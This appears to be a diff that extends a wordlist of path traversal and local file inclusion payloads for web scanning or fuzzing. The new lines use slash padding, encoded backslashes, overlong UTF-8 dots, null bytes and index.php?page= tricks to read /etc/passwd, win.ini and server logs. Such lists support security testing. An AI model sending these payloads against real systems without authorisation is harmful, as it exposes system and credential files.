@@ -783,3 +783,11 @@
 /?InternalDir=../../../../../Windows&InternalFile=win.ini
 /?InternalDir=\\..\\..\\..\\..\\usr\\local\\Serv-U&InternalFile=Serv-U-StartupLog.txt
 /?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd
+/..///////..////..//////etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
+/index.php?page=etc/passwd
+/index.php?page=etc/passwd%00
+/index.php?page=../../etc/passwd
+/index.php?page=....//....//etc/passwd
